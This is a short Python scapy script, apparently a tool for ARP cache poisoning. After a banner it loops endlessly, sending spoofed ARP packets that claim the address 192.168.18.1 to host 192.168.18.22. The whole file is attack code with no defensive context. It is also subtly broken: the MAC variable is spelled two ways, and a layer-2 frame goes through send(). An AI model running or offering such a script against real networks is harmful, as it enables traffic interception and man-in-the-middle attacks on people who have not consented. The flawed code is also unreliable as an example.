#!/usr/bin/env python3

from scapy.all import *

width = 60
text_arp = "ARP CACHE Poisoning"
subtitle = "(use Ctrl+C to stop it)"
print(width * "#")
print()
print(text_arp.center(width))
print(subtitle.center(width))
print()
print(width * "#")

clientMac = "aa:bb:cc:dd:ee:ff"

send(Ether(dst=clientMAC)/ARP(op="who-has", psrc="192.168.18.1", pdst="192.168.18.22"),
    inter=RandNum(10,40), loop=1)